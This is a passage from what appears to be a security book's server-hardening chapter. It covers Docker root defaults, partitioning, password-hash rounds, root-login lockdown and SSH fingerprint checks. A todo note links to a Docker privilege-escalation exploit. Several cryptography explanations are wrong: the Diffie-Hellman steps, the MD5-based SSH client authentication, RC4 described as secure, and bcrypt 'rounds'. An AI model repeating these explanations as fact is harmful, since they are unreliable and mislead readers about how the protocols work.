Similar to [Consuming Free and Open Source](#web-applications-identify-risks-consuming-free-and-open-source) from the Web Applications chapter, many of us trust the images on docker hub. Of course there is no reason for anyone to embed malicious code in any of them right?

#### Doppelganger images

Beware of doppelganger images that will be available for all to consume, similar to [doppelganger packages](#web-applications-countermeasures-consuming-free-and-open-source-keeping-safe-doppelganger-packages) that we discuss in the Web Applications chapter. These can contain a huge number of packages and code to hide malware in a Docker image.

#### The Default User is Root

What is worse, dockers default is to run containers, and all commands / processes within a container as root. This can be seen by running the following command:

{title="User running containers", linenos=off, lang=Bash}
    docker ps --quiet | xargs docker inspect --format '{{ .Id }}: User={{.Config.User}}'

If you have two containers running and the user has not been specified you will see something like the below, which means your two containers are running as root.

{title="User running containers output", linenos=off, lang=Bash}
    <container n Id>: User=
    <container n+1 Id>: User=

These processes have [indirect access](https://theinvisiblethings.blogspot.co.nz/2012/09/how-is-qubes-os-different-from.html) to most of the Linux Kernel (that is approximately 20 million lines of code written by humans) via many APIs such as networking, USB, storage stacks, and others. This attack surface is huge, and all before any security is added on top in the form of LXC, or libcontainer (now [opencontainers/runc](https://github.com/opencontainers/runc)). So what is an attacker going to do? They'll just avoid the security on top and attack the millions of lines of Kernel code that certainly have bugs waiting to be exploited. It is the usual story, professional attackers always go for the lowest hanging fruit, just as encryption is more commonly avoided than attacked, and doors are more commonly opened by under door devices than picking locks (lock picking takes too long) for any other reason than the challenge of it.

Images derived from other images inherit the same user defined in the parent image explicitly or implicitly, so in most cases this will default to root. 



_Todo_

%% Try this exploit: https://packetstormsecurity.com/files/138756/docker_daemon_privilege_escalation.rb.txt Chris pointed it out.

%% Resources for continuing: 
%% http://resources.infosecinstitute.com/docker-and-enterprise-security-establishing-best-practices/
%% https://benchmarks.cisecurity.org/downloads/show-single/?file=docker12.100
%% https://www.google.com/search?q=docker+security&oq=docker+security&aqs=chrome.0.0j69i60j0l4.6176j0j7&client=ubuntu&sourceid=chrome&ie=UTF-8
%% https://docs.docker.com/engine/security/security/
%% https://theinvisiblethings.blogspot.co.nz/2012/09/how-is-qubes-os-different-from.html








### Using Components with Known Vulnerabilities
![](images/ThreatTags/average-widespread-difficult-moderate.png)

This is exactly what your attackers rely on you doing. Not upgrading out of date software. This is the same concept as discussed in the Web Applications chapter under "[Consuming Free and Open Source](#web-applications-identify-risks-consuming-free-and-open-source)". Just do not do it. Stay patched.

### Lack of Backup

There is not a lot to say here, other than make sure you do this. I have personally seen so many disasters that could have been avoided if timely / regular backups had of been implemented and tested routinely. I have seen many situations where backup schedules were in place, but they had not been tested for a period of time, and when it came time to use them, they were not available for various reasons. When your infrastructure gets owned, don't be the one that can not roll back to a good known state.

### Lack of Firewall

Now this is addressed, because so many rely on firewalls to hide many weak areas of defence. The lack of a firewall if your services and communications between them are hardened does not have to be an issue, in-fact I see it as a goal many of us should have, as it forces us to build better layers of defence.

## 3. SSM Countermeasures {#vps-countermeasures}
* [MS Host Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_007)
* [MS Securing Your Web Server](https://msdn.microsoft.com/en-us/library/ff648653.aspx) This is Microsoft specific, but does offer some insight into technology agnostic risks and countermeasures
* [MS Securing Your Application Server](https://msdn.microsoft.com/en-us/library/ff648657.aspx) As above, Microsoft specific, but does provide some ideas for vendor agnostic concepts

### Forfeit Control thus Security {#vps-countermeasures-forfeit-control-thus-security}
![](images/ThreatTags/PreventionEASY.png)

Bringing your VPS(s) in-house provides all the flexibility/power required to mitigate just about all the risks due to outsourcing to a cloud or hosting provider. How easy this will be is determined by how much you already have invested. Cloud offerings are often more expensive in monetary terms for medium to large environments, so as you grow, the cost benefits you may have gained due to quick development up-front will often become an anchor holding you back. Because you may have bought into their proprietary way of doing things, it now becomes costly to migrate, and your younger competitors which can turn quicker, out manoeuvre you. Platform as a Service often appears even more attractive, but everything comes at a cost, cloud platforms may look good to start with, but often they are to good, and the costs will catch up with you. All that glitters is not gold.

### Windows

#### PSExec {#vps-countermeasures-psexec}

_Todo_: How hard is prevention?

![](images/ThreatTags/Prevention.png)

_Todo_: [Take this further](https://github.com/binarymist/HolisticInfoSec-For-WebDevelopers/issues/1)

### Minimise Attack Surface by Installing Only what you Need
![](images/ThreatTags/PreventionVERYEASY.png)

I am hoping this goes without saying, unless you are setting up a Windows server with "all the stuff" that you have little control over its hardening process, which is why I favour UNIX based servers. I/You have all the control, if anything goes wrong, it will usually be our own fault for missing or neglecting something. The less you have on your servers, the fewer servers you have, the smaller the network you have, the less employees you have, basically the smaller and lesser of everything you have, the less there is to compromise by an attacker and the quicker you can move.

### Disable, Remove Services. Harden what is left {#vps-countermeasures-disable-remove-services-harden-what-is-left}

Much of this section came from a web server I set-up, from install and through the hardening process.

There are often a few services you can disable even on a bare bones Debian install and some that are just easier to remove. Then go through the process of hardening what is left. Make sure you test before and after each service you disable, remove or harden, watch the port being opened/closed, etc. Remember, the less you have, the less there is to be exploited.

#### Partitioning on OS Installation {#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation}
![](images/ThreatTags/PreventionAVERAGE.png)

By creating many partitions and applying the least privileges necessary to each in order to be useful, you are making it difficult for an attacker to carry out many malicious activities that they would otherwise be able to.

This is a similar concept to tightly constraining input fields to only be able to accept structured data (names (alpha only), dates, social security numbers, zip codes, email addresses, etc) rather than just leaving the input wide open to be able to enter any text as discussed in the Web Applications chapter under [What is Validation](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation).

The way I'd usually set-up a web servers partitions is as follows. Delete all the current partitions and add the following. `/` was added to the start and the rest to the end, in the following order: `/`, `/var/log` (optional, but recommended), `/var/tmp` (optional, but recommended), `/var`, `/tmp`, `/opt`, `/usr/share` (optional, but recommended), `/usr`, `/home`, `swap`.

You will notice in the [Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section, that I ended up adding additional partitions (mentioned in the previous paragraph) to apply finer grained control on directories often targeted by attackers. It is easier to add those partitions here, we will add options to them in the Lock Down section.

![](images/PartitioningDisk.png)

If you add the "optional, but recommended" partitions, then they may look more like the following after a `df -h`:

{linenos=off, lang=Bash}
    Filesystem      Size  Used Avail Use% Mounted on
    /dev/sda1       4.5G  453M  3.8G  11% /
    /dev/sda8       6.3G  297M  5.7G   5% /usr
    tmpfs           247M     0  247M   0% /dev/shm
    /dev/sda9        18G  134M   17G   1% /home
    /dev/sda7       3.7G  7.5M  3.4G   1% /opt
    /dev/sda6       923M  1.2M  859M   1% /tmp
    /dev/sda13      965M  340M  560M  38% /usr/share
    /dev/sda5       3.4G  995M  2.2G  32% /var
    /dev/sda11       95M  1.6M   87M   2% /var/tmp
    /dev/sda12      186M   39M  134M  23% /var/log

The sizes should be set-up according to your needs. If you have plenty of RAM, make your `swap` small, if you have minimal RAM (barely (if) sufficient), you could double the RAM size for your `swap`. It is usually a good idea to think about what mount options you want to use for your specific directories. This may shape how you set-up your partitions. For example, you may want to have options `nosuid`,`noexec` on `/var` but you can’t because there are shell scripts in `/var/lib/dpkg/info` so you could set-up four partitions. `/var` without `nosuid`,`noexec` and `/var/tmp`, `/var/log`, `/var/account` with `nosuid`,`noexec`. Look ahead to the [Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section for more details, or just wait until you get to it.

You can think about changing `/opt` (static data) to mount read-only in the future as another security measure if you like.

#### Apt Proxy Set-up

If you want to:

1. save on bandwidth
2. Have a large number of your packages delivered at your network speed rather than your internet speed
3. Have several Debian based machines on your network

I recommend using apt-cacher-ng, installable with an `apt-get`, you will have to set this up on a server, by modifying the `/var/apt-cacher-ng/acng.conf` file to suite your environment. There is ample documentation. Then add the following file to each of your debian based machines.

`/etc/apt/apt.conf` with the following contents and set its permissions to be the same as your sources.list:

{linenos=off, lang=Bash}
    # IP is the address of your apt-cacher server
    # Port is the port that your apt-cacher is listening on, usually 3142
    Acquire::http::Proxy “http://[IP]:[Port]”;

Now just replace the apt proxy references in the `/etc/apt/sources.list` of your consuming servers with the internet mirror you want to use, so we contain all the proxy related config in one line in one file. This will allow the requests to be proxied and packages cached via the apt cache on your network when requests are made to the mirror of your choosing.

Update the list of packages then upgrade them with the following command line. If you are using sudo, you will need to add that to each command:

{linenos=off, lang=Bash}
    apt-get update && apt-get upgrade
    # Only run apt-get upgrade if apt-get update is successful (exits with a status of 0).

Now if you're working through an installation, you'll be asked for a mirror to pull packages from. If you have the above apt caching server set-up on your network, this is a good time to make it work for you. You'll just need to enter the caching servers IP address and port.

A> The steps you take to harden your server(s) that will have many user accounts will be considerably different to this. Many of the steps I have gone through here will be insufficient for a server with many users. The hardening process is not a one time procedure. It ends when you decommission the server. Be prepared to stay on top of your defences. It is much harder to defend against attacks than it is to exploit a vulnerability.

#### Review Password Strategies {#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies}
![](images/ThreatTags/PreventionEASY.png)

A lot of the following you will have to follow along with on your VPS in order to understand what I am saying.

Make sure passwords are encrypted with an algorithm that will stand up to the types of attacks and hardware you anticipate that your attackers will use. I have provided additional details around which Key Derivation Functions are best suited to which types of hardware in the "[Which KDF to use](#web-applications-countermeasures-data-store-compromise-which-kdf-to-use)" section within the Web Applications chapter.

In most cases you will [want to](http://www.tldp.org/HOWTO/Shadow-Password-HOWTO-2.html#ss2.2) shadow your passwords. This should be the default in most, or all recent Linux distributions.

How do you know if you already have the Shadow Suite installed? If you have a `/etc/shadow` file, take a look at the file and you should see your user and any others with an encrypted value following it. There will be a reference to the password from the `/etc/passwd` file, stored as a single `X` (discussed below). If the Shadow Suite is not installed, then your passwords are probably stored in the `/etc/passwd` file.

[Crypt](https://en.wikipedia.org/wiki/Crypt_(C)), crypt 3 or crypt(3) is the Unix C library function designed for password authentication. The following table shows which Operating Systems have support out of the box and with which hashing functions or key derivation functions are supported. We discuss this table in a moment, so don't worry just yet if you do not understand it all:

&nbsp;

![](images/CryptSupportInOperatingSystems.png)

&nbsp;

It may be worth looking at and modifying the `/etc/shadow` file. Consider changing the “maximum password age” and “password warning period”. Consult the man page for shadow for full details. Check that you are happy with which encryption algorithms are currently being used. The files you will need to look at are: `/etc/shadow` and `/etc/pam.d/common-password`. The man pages you will probably need to read in conjunction with each other are the following:

* shadow
* pam.d
* crypt 3
* pam_unix

Out of the box crypt (glibc) supports MD5, SHA-256 and SHA-512, I wouldn't bother looking at DES, and MD5 is common but weak. You can also use the blowfish cipher via the bcrypt KDF with a little more work (a few minutes). The default of SHA-512 (in debian) enables salted passwords. The SHA family of hashing functions are to fast for password hashing. Crypt applies key stretching to slow brute-force cracking attempts down. The default number of rounds [have not changed](https://access.redhat.com/articles/1519843) in at least 9 years, so it is well worth modifying the number to keep up with hardware advancements. There are some [details](#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-technology-and-design-decisions-membershipreboot) to work out what the factor should be, provided by OWASP in the MembershipReboot section in the Web Applications chapter. The [default number of rounds](https://en.wikipedia.org/wiki/Passwd) are as follows:

* MD5: 1000 rounds
* Blowfish: 64 rounds
* SHA-[256, 512]: 5000 rounds

The OWASP advice says we should double the rounds every subsequent two years. So for the likes of SHA in 2007 having 5000 rounds, we should be looking at increasing this to `160000` in the year 2017, so if you are still with the default, you are a long way behind and it is time to do some serious key stretching.

![](images/KeyStretching.png)

How can you tell which algorithm you are using, salt size, number of iterations for the computed password, etc? The [crypt 3](http://man7.org/linux/man-pages/man3/crypt.3.html#NOTES) man page explains it all. By default a Debian install will be using SHA-512 which is better than MD5 and the smaller SHA-256. Don't take my word for it though, just have a look at the `/etc/shadow` file. I explain the file format below.

Now by default I did not have a “rounds” option in my `/etc/pam.d/common-password` module-arguments. Having a large iteration count (number of times the encryption algorithm is run (key stretching)) and an attacker not knowing what that number is, will slow down a brute-force attack.

You can increase the `rounds` by overriding the default in `/etc/pam.d/common-passwowrd`. You override the default by adding the rounds field and the value you want to use, as seen below.

{title="/etc/pam.d/common-passwowrd", linenos=off, lang=Bash}
    password [success=1 default=ignore] pam_unix.so obscure sha512 rounds=[number of rounds]

Next time someone changes their password (providing the account is local), `[number of rounds]` number of `rounds` will be used.

I would suggest adding this and re creating your passwords now. Just before you do, it is usually a good idea to be logged in at an extra terminal and possibly a root terminal as well, until you are sure you can log in again. It just makes things easier if for what ever reason you can no longer log in at a new terminal. Now... as your normal user run:

`passwd`

providing your existing password then your new one twice. You should now be able to see your password in the `/etc/shadow` file with the added `rounds` parameter.

Also have a check in `/var/log/auth.log`. Reboot and check you can still log in as your normal user. If all good. Do the same with the root account.

Let's have a look at the `passwd` and `shadow` file formats.

`:` is a separator in both `/etc/shadow` and `/etc/passwd` files:

{title="/etc/shadow", linenos=off, lang=Bash}
    you:$id$rounds=<number of rounds, specified in /etc/pam.d/common-password>$[up to 16 character salt]$[computed password]:<rest of string>

1. `you` is the Account username
2. `$id$salt$hashedpassword` is generally considered to be called the encrypted password, although this is made up of three base fields separated by the `$`. The `id` can be any of the *Scheme id*s that crypt supports, as shown in the above table. How the rest of the substrings in this field are interpreted is [determined](http://man7.org/linux/man-pages/man3/crypt.3.html#NOTES) by what is found in the `id` field. The salt can be up to 16 characters. In saying that, the salt can be [augmented](http://backreference.org/2014/04/19/many-ways-to-encrypt-passwords/) by prepending the `rounds=<number of rounds, sourced from /etc/pam.d/common-password>$` directive.

The hashed part of the password string is the actual computed password. The size of this string is fixed as per the below table:

![](images/EncryptedPartOfCryptStringInShadowFile.png)

The rest of the fields are as per below.

{title="/etc/shadow", linenos=off, lang=Bash}    
    daemon:*:15980:0:99999:7:::

1. `daemon` is the account username
2. `*` is the place where the salt and hashed password would go, the asterisk means that this account can not be used to log in.
3. `15980` is the number of days from the Unix "epoch" (1970-1-1) to when the password was changed.
4. `0` is the minimum password age or number of days that the user will have to wait before they will be allowed to change their password. An empty field or `0` means that there is no minimum.
5. `99999` is the maximum number of days until the user will be forced to change their password. `99999` or an empty value means that there is no limit to the maximum age that the password should be changed. If the maximum password age is lower than the minimum password age (No. 4) the user can not change their password.
6. `7` is the password warning period. An empty value or `0` means that there is no warning period.
7. The last three fields are:
    1. Password inactivity period, days before the account is made inactive
    2. Account expiration date, expressed in days since Unix "epoch" (1970-1-1)
    3. Reserved field, not currently used

The format of the `/etc/passwd` file is as follows:

{title="/etc/passwd", linenos=off, lang=Bash}    
    root:x:0:0:root:/root:/bin/bash
    you:x:1000:1000:you,,,:/home/you:/bin/bash

1. `root` and `you` are the account usernames
2. `x` is the placeholder for password information. The password is obtained from the `/etc/shadow` file.
3. `0` or `1000` is the user Id, the root user always has an Id of `0`.
4. The second `0` or `1000` is the primary group Id for the user, the root user always has a primary group Id of `0`.
5. `root` or `you,,,` is the comment field. This field can be used to describe the user or user's function. This could be used for contact details, or maybe what the account is used for.
6. `/root` or `/home/you` is the users home directory. For regular users, this would usually be `/home/[you]`. For root, this is `/root`.
7. `/bin/bash` is the users default shell.

##### [Consider](https://lists.debian.org/debian-user/2011/04/msg00550.html) changing to Bcrypt

You should find this fairly straight forward on a Debian server. In order to [use bcrypt](https://serverfault.com/questions/10585/enable-blowfish-based-hash-support-for-crypt/11685) with slowpoke blowfish which is the best (very slow) algorithm available for hashing passwords currently, which is obvious by the number of iterations applied by default as noted above, 64 rounds as opposed to `MD5`s 1000 rounds, and `SHA`s 5000 rounds from 2007.

1. In Debian you need to install the package libpam-unix2
2. Then you will have to edit the following files under `/etc/pam.d/`, and change all references to `pam_unix.so` to `pam_unix2.so` in the following files:

* common-account
* common-auth
* common-password, also while you are in this one, replace the current cipher (probably `sha512`) with `blowfish`
* common-session

Passwords that are updated after these modifications are made will be computed using blowfish. Existing shadow passwords are not modified until you change them. So you need to change them immediately (one at a time to start with please. Leave root till last) if you expect them to be using the bcrypt KDF. Do this the same way we did above with the `passwd` command.

Something to be aware of: If the version of libpam-unix2 that you just installed does not support the existing crypt scheme used to create an existing users password, that user may not be able to log in. You can get around this by having root create a new password for that user, because `passwd` will not ask root for that users existing password.

##### Password GRUB

Consider setting a password for GRUB, especially if your server is directly on physical hardware. If it is on a hypervisor, an attacker has another layer to go through before they can access the guests boot screen.

#### Disable Root Logins from All Terminals
![](images/ThreatTags/PreventionVERYEASY.png)

There are a handful of files to [check and/or modify](https://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s-restrict-console-login) in terms of disabling root logins.

* `/etc/pam.d/login`  
This file along with the next one enables the `pam_securetty.so` module. When this file along with the next one is properly configured, when root tries to login on an insecure console (that's one that is not listed in the next file), they will not be prompted for a password and will instead receive a message like the following:  
`pam_securetty(login:auth): access denied: tty '/dev/tty1' is not secure :`  
`Login incorrect`  
Review and understand the contents of this file. There are plenty of comments, and read the [pam_securetty](http://linux.die.net/man/8/pam_securetty) man page, which also refers to other applicable man pages. By default, you may not need to change anything in here. Do check and make sure that the following line, which provides the possibility to allow logins with null (blank) passwords, has the `nullok` text removed from it:  
`auth       required   pam_unix.so nullok`  
I generally also like to make sure that the following line does not exist, as it allows root to log into the system from the local terminals listed in `/etc/inittab`. A better practise is to only allow low privilege users access to terminals and then elevate privileges once logged in:  
`auth     requisite  pam_securetty.so`  
* `/etc/securetty`  
Root access is allowed to all terminals listed in this file. Take a backup of this file, then modify by commenting out all of the consoles you don't need (preferably all of them), or better still, use the "nothingness" device to send (fill the file with) "nothing"  
`cat /dev/null > /etc/securetty`  
* `/etc/inittab`  
This file contains a list of the virtual consoles / tty devices you have.  
* `/etc/security/access.conf`  
An [alternative](https://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s-pam-rootaccess) to the previous method is to enable the `pam_access` module and make modifications to this file. Currently everything is commented out by default. Enabling this module and configuring it, allows for finer grained access control, but log messages are lacking. I usually don't touch this module.

Now test that you are unable to log into any of the text terminals (TeleTYpewriter, tty) listed in `/etc/inittab`. Usually these can be accessed by [Ctrl]+[Alt]+[F[1, 2, 3, ...]] if you are dealing with a physical machine. If you are dealing with a hypervisor, attempt to log-in to the guests console via the hypervisor management UI as root, in the case of VMware ESX(i) vSphere. You should no longer be able to.

Make sure that if your server is not physical hardware, but is a VM, then the hosts password is long and consists of a random mix of upper case, lower case, numbers, and special characters.

#### SSH {#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh}
![](images/ThreatTags/PreventionVERYEASY.png)

We covered fingerprinting of SSH under the Reconnaissance section of the Processes and Practises chapter in [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers). Here we will discuss:

1. The underlying cyrpto-systems of SSH
2. Determining the authenticity of the server that you are attempting to log in to
3. What you can do to harden SSH

First of all, make sure you are using SSH version 2. Version 1 and its progressions have well documented known vulnerabilities. Version 2 has none at the time of writing this. You can confirm this in multiple ways. The two simplest techniques are as follows:

1. Check the `Protocol` field of `/etc/ssh/sshd_config` on your server, it should say `2`, as in `Protocol 2`
2. Try forcing the use of version 1 and you should be denied.  
`ssh -1 you@your_server`  
# You should see the following:  
`Protocol major versions differ: 1 vs. 2`  
# The following will force version 2  
`ssh -2 you@your_server`

##### Symmetric Cryptosystems

Often refereed to as "secret key" or "shared secret" encryption. In the case of Symmetrical encryption, typically only a single key is required for both ends of the communication, or a pair of keys in which a simple transformation is required to establish the relationship between them (not to be confused with how Diffie-Hellman (asymmetric) parties establish their secret keys). The single key should be kept secret by the parties involved in the conversation. This key can be used to both encrypt and decrypt messages.

Some of the commonly used and well known ciphers used for this purpose are the following:

* AES (Advanced Encryption Standard block cipher with either key sizes of 128, 192 or 256 bits, considered highly secure, succeeded DES during the program National Institute of Standards Technology (NIST) began in 1997 for that purpose, which took five years. Approved in December 2001)
* 3DES (block cipher variant of DES. Increases its security by increasing the key length)
* ARCFOUR (or RC4 is a stream cipher, used to be an unpatented trade-secret, until the source code was posted on-line anonymously, RC4 is very fast, but less studied than other algorithms. It is considered secure, providing the caveat of never reusing a key is observed.)
* CAST-128/256 (block cipher described in [Request for Comments (RFC) 2144](http://www.rfc-editor.org/rfc/rfc2144.txt), as a DES-like substitution-permutation crypto algorithm, designed in the early 1990s by Carlisle Adams and Stafford Tavares, available on a worldwide royalty-free basis)
* Blowfish (block cipher invented by Bruce Schneier in 1993, key lengths can vary from 32 to 448 bits. It is much faster than DES and IDEA, though not as fast as ARCFOUR. It has no patents and is intended to be free for all to use. Has received a fair amount of cryptanalytic scrutiny and has proved impervious to attack so far)
* Twofish (block cipher invented by Bruce Schneier, with the help from a few others, submitted in 1998 to the NIST as a candidate for the AES, to replace DES. It was one of the five finalists in the AES selection process out of 15 submissions. Twofish has no patents and is free for all uses. Key lengths can be 128, 192 or 256 bits. Twofish is also designed to be more flexible than Blowfish.)
* IDEA (Bruce Schneier in 1996 [pronounced](http://docstore.mik.ua/orelly/networking_2ndEd/ssh/ch03_09.htm) it "the best and most secure block algorithm available to the public at this time". Omitted from SSH2 because it is patented and requires royalties for commercial use.)

The algorithm selected to be used for encrypting the connection is decided by both the client and server, both must support the chosen cipher. Each is configured to work their way through a list from most preferred to least preferred. Entering `man ssh_config` into a terminal will show you the default order for your distribution.

##### Asymmetric Cryptosystems

Also known as public-key or key-pair encryption, utilises a pair of keys, one which is public and one which by design is to be kept private. You will see where this is used below when we set-up the SSH connection. Below are the most commonly used public-key algorithms: 

* RSA (or Rivest-Shamir-Adleman is the most widely used asymmetric cipher and my preference at this point in time.). Was claimed to be patented by Public Key Partners, Inc (PKP). The algorithm is now in the public domain, and was added to SSH-2 not long after its patent expired.
* DH (Diffie-Hellman key agreement was the first public-key system published in open literature.) Invented in 1976 and patented in 1977, now expired and in the public domain. It allows two parties to derive a shared secret key (sounds similar to symmetric encryption, but it is not similar) securely over an open channel. "_The parties engage in an exchange of messages, at the end of which they share a secret key. It's not feasible for an eavesdropper to determine the shared secret merely from observing the exchanged messages. SSH-2 uses the DH algorithm as its required (and currently, its only defined) key-exchange method._"
* DSA (or Digital Signature Algorithm was developed by the the National Security Agency (NSA), but covered up by NIST first claiming that it had designed DSA.). Was originally the only key-exchange method for SSH-2
* ECDSA (or Elliptic Curve Digital Signature Algorithm), was accepted in 1999 as an ANSI standard, NIST and IEEE standards in 2000.

##### Hashing

Also known as message digests and one-way encryption algorithms. Hash functions create a fixed-length hash value based on the plain-text. Hash functions are often used to determine the integrity of a file, message, or any other data.

If a given hash function is run on a given message twice, the resulting hash value should be identical. Modifying any part of the message has a very high chance of creating an entirely different hash value.

Any given message should not be able to be re-created from the hash of it.

When the symmetric encryption negotiation is being carried out, a Message Authentication Code (MAC) algorithm is selected from the clients default list of MAC's, the first one that is supported on the server is used. You can see the default list by entering `man ssh_config` into a terminal.

Once the encryption properties are chosen as detailed below in the first step of [SSH Connection Procedure](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure), each message sent must contain a MAC, so that the receiving party can verify the integrity of the message. The MAC is the [result of](https://tools.ietf.org/html/rfc4253):

1. The shared symmetric secret key
2. The packet sequence number of the message
3. The unencrypted message content  

The MAC is sent as the last part of the [binary packet protocol](https://tools.ietf.org/html/rfc4253#section-6).

##### SSH Connection Procedure {#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure}

The two main stages of establishing the connection are:

1. Establish the session encryption
2. Authenticate the client to the server (should the user be allowed access to the server)

The following are the details for each:

**Establish the session encryption**

The SSH client is responsible for initiating the TCP handshake with the server. The server responds with the protocol versions it supports, if the client can support one of the protocol versions from the server, the process continues. The server also provides its public (asymmetric) host key. The client verifies that the server is known to it, by checking that the public host key sent from the server is in the clients:  
`~/.ssh/known_hosts`

This record is added on first connection to the server, as detailed in the section ["Establishing your SSH Servers Key Fingerprint"](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint) below.

At this stage, a session key is negotiated between the client and server using Diffie-Hellman (DH) as an ephemeral (asymmetric) key exchange algorithm, each combining their own private data with public data from the other party, which allows both parties to arrive at the identical secret symmetric session key. The public and private key pairs used to create the shared secret key in this stage have nothing to do with the client authenticating to the server.

Now in a little more detail, the Diffie-Hellman key agreement works like this:

1. Both client and server come to agreement on a seed value, that is a large prime number.
2. Both client and server agree on a symmetric cipher, so that they are both encrypting/decrypting with the same block cipher, usually AES
3. Each party then creates another prime number of their own to be used as a private key for this ephemeral DH interaction
4. Each party then create a public key which they exchange with the other party. These public keys are created using the symmetric cipher from step 2, the shared prime number from step 1, and derived from the private key from step 3.
5. The party receiving the other parties public key, uses this, along with their own private key, and the shared prime number from step 1 to compute their own secret key. Because each party does the same, they both arrive at the same (shared/symmetric/secret) key.
6. All communications from here on are encrypted with the same shared secret key, the connection from here on is known as the *binary packet protocol*. Each party can use their own shared secret key to encrypt and decrypt, messages from the other party.

**Authenticate the client to the server**

The second stage is to authenticate the client, establishing whether they should be communicating with the server. There are several methods for doing this, the two most common are passwords and key-pair. SSH defaults to passwords, as the lowest common denominator, plus it often helps to have password authentication set-up in order to set-up key-pair authentication, especially if you don't have physical access to the server(s).

SSH key pairs are asymmetric. The server holds the clients public key and is used by the server to encrypt messages that it uses to authenticate the client. The client in turn receives the messages from the server and decrypts them with the private key. If the public key falls into the wrong hands, it's no big deal, because the private key can not be deduced from the public key, and all the authentication public key is used for is verifying that the client holds the private key for it.

The authentication stage continues directly after the encryption has been established from the previous step.  

1. The client sends the Id of the key pair they want to authenticate as to the server
2. The server checks the `~/.ssh/authorized_keys` file for the Id of the public keys account that the client is authenticating as
3. If there is a matching Id for a public key within `~/.ssh/authorized_keys`, the server creates a random number and encrypts it with the public key that had a matching Id
4. The server then sends the client this encrypted number
5. Now the client needs to prove that it has the matching private key for the Id it sent the server. It does this by decrypting the message the server just sent with the private key, revealing the random number created on the server.
6. The client then combines the number from the server with the shared session key produced in the session encryption stage and obtains the MD5 hash from this value.
7. The client then sends the hash back in response to the server.
8. The server then does the same as the client did in step 6 with the number that it generated, combining it with the shared session key and obtaining the MD5 hash from it. The server then compares this hash with the hash that the client sent it. If they match, then the server communicates to the client that it is successfully authenticated.

Below in the [Key-pair Authentication](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication) section, we work through manually (hands on) setting up Key-pair authentication.

##### Establishing your SSH Servers Key Fingerprint {#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint}

When you connect to a remote host via SSH that you have not established a trust relationship with before, you are going to be told that the authenticity of the host your attempting to connect to can not be established.

{linenos=off, lang=Bash}
    you@yourbox ~ $ ssh you@your_server
    The authenticity of host 'your_server (your_server)' can't be established.
    RSA key fingerprint is 23:d9:43:34:9c:b3:23:da:94:cb:39:f8:6a:95:c6:bc.
    Are you sure you want to continue connecting (yes/no)?

Do you type yes to continue without actually knowing that it is the host you think it is? Well, if you do, you should be more careful. The fingerprint that is being put in front of you could be from a Man In the Middle (MItM). You can query the target (from “its” shell of course) for the fingerprint of its key easily. On Debian you will find the keys in `/etc/ssh/`

When you enter the following:

`ls /etc/ssh/`

you should get a listing that reveals the private and public keys. Run the following command on the appropriate key to reveal its fingerprint.

For example if SSH is using rsa:

`ssh-keygen -lf ssh_host_rsa_key.pub`

For example if SSH is using dsa:

`ssh-keygen -lf ssh_host_dsa_key.pub`

If you try the command on either the private or publick key you will be given the public keys fingerprint, which is exactly what you need for verifying the authenticity from the client side.

Sometimes you may need to force the output of the fingerprint_hash algorithm, as ssh-keygen may be displaying it in a different form than it is shown when you try to SSH for the first time. The default when using ssh-keygen to show the key fingerprint is sha256, unless it is an old version, but in order to compare apples with apples you may need to specify md5 if that is what is being shown when you attempt to login. You would do that by issuing the following command:

`ssh-keygen -lE md5 -f ssh_host_dsa_key.pub`

If that does not work, you can specify md5 from the client side with:

`ssh -o FingerprintHash=md5 <your_server>`

Alternatively this can be specified in the clients `~/.ssh/config` file as per the following, but I would not recommend this, as using md5 is [less secure](https://en.wikipedia.org/wiki/MD5#Security).

{linenos=off, lang=Bash}
    Host <your_server>
        FingerprintHash md5

Prior to [OpenSSH 6.8](http://www.openssh.com/txt/release-6.8) The fingerprint was provided as a hexadecimal md5 hash. Now it is displayed as base64 sha256 by default. You can check which version of SSH you are using with:

{linenos=off, lang=Bash}
    sshd -v

You can find additional details on the man pages for the options, both ssh-keygen and ssh.

Do not connect remotely and then run the above command, as the machine you are connected to is still untrusted. The command could be dishing you up any string replacement if it is an attackers machine. You need to run the command on the physical box or get someone you trust (your network admin) to do this and hand you the fingerprint.

Now when you try to establish your SSH connection for the first time, you can check that the remote host is actually the host you think it is by comparing the output of one of the previous commands with what SSH on your client is telling you the remote hosts fingerprint is. If it is different, it is time to start tracking down the origin of the host masquerading as the address your trying to log in to.

Now, when you get the following message when attempting to SSH to your server, due to something or somebody changing the hosts key fingerprint:

{linenos=off, lang=Bash}
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
    Someone could be eavesdropping on you right now (man-in-the-middle attack)!
    It is also possible that a host key has just been changed.
    The fingerprint for the RSA key sent by the remote host is
    23:d9:43:34:9c:b3:23:da:94:cb:39:f8:6a:95:c6:bc.
    Please contact your system administrator.
    Add correct host key in /home/me/.ssh/known_hosts to get rid of this message.
    Offending RSA key in /home/me/.ssh/known_hosts:6
      remove with: ssh-keygen -f "/home/me/.ssh/known_hosts" -R your_server
    RSA host key for your_server has changed and you have requested strict checking.
    Host key verification failed.

The same applies. Check that the fingerprint is indeed the intended target hosts key fingerprint. If it is, you can continue to log in.

